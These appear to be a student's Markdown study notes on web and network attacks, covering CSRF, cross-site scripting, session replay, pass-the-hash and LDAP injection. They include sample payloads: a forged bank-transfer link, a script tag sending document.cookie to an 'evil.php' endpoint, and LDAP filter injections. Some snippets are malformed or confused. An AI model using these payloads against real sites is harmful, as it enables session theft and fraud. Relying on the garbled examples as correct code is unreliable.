#NetworkSecurity [[27. Threat Intelligence]]
# Buffer overflow
- Address space randomization minimizes the changes that it can occur

# Null pointer dereference attack
- Could cause error handling conditions to be overwrote
- Could cause the very first thing that gets executed in memory to be overwrote

# Cross site request forgery (CSRF)
- <a href=”[https://www.w3schools.com](https://www.w3schools.com)”> Visit W3Schools </a>
- <a href=”[https://www.mybank.com?action=transfer&to=1789433&amount=1000$”](https://www.mybank.com?action=transfer&to=1789433&amount=1000$%E2%80%9D)> Funny_Image.jpg </a>
- The victim must have been logged in recently and clicked the “keep me logged in” button which gives the user a session cookie.
- Protections:
    - No keep me logged in button
    - Can this be done in one click?
- Steps
    - Perpetrator forges a request for a fund transfer to a website
    - Perpetrator embeds the request into a hyperlink and sends it to visitors who may be logged into the site
    - A visitor clicks on the link, inadvertently sending the request to the website
    - Website validates request and transfers funds from the visitor’s account to the perpetrator

# Session replay attack
- Not a specific attack, but a class of attacks where an attacker is able to get credentials and play it back to the server at a different time and get the same results
- For example if Logan is talking to Grace and sends Grace a password and an attacker is able to get the packet, can the attacker pass the packet to Grace at a different time.
- Timestamps prevent this, if the timestamp was from the past it cannot be reused.

# Cross site scripting
- Say you have craigslist or a chatroom, the site needs to allow you to upload content, you can not only post text but also formatted text. Say you are commenting on an article or posting a used car add. Maybe I am not just going to bold the text but also put in a <SCRIPT> tag. You have created a javascript and embedded it in the uploaded data. </SCRIPT>
- Possible when a user can upload HTML content (with scripts).
- Utilizes the trust a victim has for a 3rd party website.
- Could be a session replay attack if you steal some ones cookie OR you can run any code that is something that the website allows you to do.
- <SCRIPT type=”text/javascript” varaddr=’../evil.php?cakemonster=’ + escape(document.cookie);> </SCRIPT>
- Steps
    - Hacker injects trusted website with malicious script
    - Victim visits trusted website and triggers malicious script
    - Victim’s browser executes malicious script and unknowingly forwards desired information (session token, cookie, etc.) to hacker.

# Pass the hash (example of session replay)
-   Has a couple of assumptions:
    -   An account is compromised, someone else has hacked one computer in an organization
    -   Victim has admin rights on the local machine
    -   Another victim has logged onto the machine previously
-   Attack
    -   Hacker dumps the local security authority memory (keeps a copy of the username and hashed password).
    -   Hacker retrieves the username and hash of other users that have logged on fairly previously
    -   Hacker can pass the hash to validate themselves

# LDAP injection attack
-   Looking up users
    -   [](http://www.mycorp.com/people_search.asp?name=Sam)[http://www.mycorp.com/people_search.asp?name=Sam](http://www.mycorp.com/people_search.asp?name=Sam))(zone=public)(zone=public))
    -   [](http://www.mycorp.com/people_search.asp?name=Sam)[http://www.mycorp.com/people_search.asp?name=Sam](http://www.mycorp.com/people_search.asp?name=Sam))(zone=*)(zone=public))
-   Normal code statement
    -   find(”(&cn=” + username + “)(userPassword=” + pass +”))”)
        -   This statement looks up a person whose username is this and password is this?
    -   find(”(&cn=” + admin(&))+ “)(userPassword=” + Whatever!+”))”)
        -   The and means true, in LDAP the second statement is ignored, only the first is used
    -   find(”(&cn=” + admin(&))+ “)(userPassword=” + Whatever!+”))”)
        -   The blue does nothing
-   Prevention is the same as SQL injections
    -   Parameterized queries
    -   Character escaping

# Header Manipulation Attack
- Collect of Exploits
- We craft a get request with non-standard parameters to perform a variety of functions
- Two requests (second request is smuggled in with the first)
- Tricking the server to execute a script
- Poisoning the DNS cache

# Web Browsing Threats
- "Because that's where the money is"
- Cookies
- Autofill
- Third-Party Plugins
- Flash
- JavaScript

# Client-Side Attacks
- When the Server is malicious
- Watering Hole Attacks
- Driver Attack Example

# Zero-Day Attack
- Previously unknown attacks
- Hard to defend against
- Developer process to eliminate
	- Analyze
	- Test
	- Report
	- Mitigate
